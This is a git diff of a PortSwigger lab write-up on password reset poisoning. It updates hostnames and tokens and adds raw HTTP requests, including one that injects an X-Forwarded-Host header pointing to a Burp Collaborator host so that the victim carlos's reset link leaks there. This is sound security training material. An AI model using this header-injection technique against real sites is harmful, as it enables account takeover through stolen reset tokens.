@@ -62,9 +62,38 @@ username=wiener
 
 After forwarding the above request, we can see the reset password link has been sent to wiener's email.
 
-![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/3b511076-ac35-4703-a6f9-a7341d401729)
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/06ff086c-37fa-499e-8d9f-23590381cc4a)
 
-> Here the server address in the link is `0ad700ef037b819c8101e38400e800fb.web-security-academy.net`
+> Here the server address in the link is `0a6a00d804e104958379c52d007300c9.web-security-academy.net` & `temp-forgot-password-token=T9Ou8Nr4HEdnClSG7cAwBWkaukma1orc`
+
+When we click the link, enter  our new password , a *GET* request is sent to /forgot-password along with a token like this
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/624308f1-4933-4217-a18c-00c8f8d4706a)
+
+
+```http
+POST /forgot-password?temp-forgot-password-token=T9Ou8Nr4HEdnClSG7cAwBWkaukma1orc HTTP/2
+Host: 0a6a00d804e104958379c52d007300c9.web-security-academy.net
+Cookie: session=Kt96OLQV957nJQYx78S8js3xPZQGU1Ow
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 105
+Origin: https://0a6a00d804e104958379c52d007300c9.web-security-academy.net
+Referer: https://0a6a00d804e104958379c52d007300c9.web-security-academy.net/forgot-password?temp-forgot-password-token=T9Ou8Nr4HEdnClSG7cAwBWkaukma1orc
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+temp-forgot-password-token=T9Ou8Nr4HEdnClSG7cAwBWkaukma1orc&new-password-1=newpass&new-password-2=newpass
+```
+
+And thus we've finally changed the password of wiener using the password reset link.
 
 #### Perform password reset poisoning on carlos -
 
@@ -73,17 +102,17 @@ We modify the *POST* Request sent to /`forget-password` by adding an additional 
 
 ```http
 POST /forgot-password HTTP/2
-Host: 0ad700ef037b819c8101e38400e800fb.web-security-academy.net
-Cookie: session=eiaiChHGmHu6RsgwQZFBmVObpnNqH12j
-X-Forwarded-Header: 435q984u5naoa70dzdstyeec93ft3i.oastify.com
+Host: 0a6a00d804e104958379c52d007300c9.web-security-academy.net
+Cookie: session=Kt96OLQV957nJQYx78S8js3xPZQGU1Ow
+X-Forwarded-Host: bcrgwu2v1zwfwvzuucncws1qnht8hx.oastify.com
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
-Origin: https://0ad700ef037b819c8101e38400e800fb.web-security-academy.net
-Referer: https://0ad700ef037b819c8101e38400e800fb.web-security-academy.net/forgot-password
+Origin: https://0a6a00d804e104958379c52d007300c9.web-security-academy.net
+Referer: https://0a6a00d804e104958379c52d007300c9.web-security-academy.net/forgot-password
 Upgrade-Insecure-Requests: 1
 Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
@@ -91,11 +120,11 @@ Sec-Fetch-Site: same-origin
 Sec-Fetch-User: ?1
 Te: trailers
 
-username=wiener
+username=carlos
 ```
 Now we can see that we got the reset link to our mail(wiener) but this time the server name is our burp collaborator server.
 
-![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/b354778a-3cb9-48ca-a8c3-b0d614e36228)
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/998a51a6-9adb-436c-bb32-127dfc5b627f)
 
 We can change the username parameter to carlos ie(`username=carlos`) to send a password reset email to carlos.
 
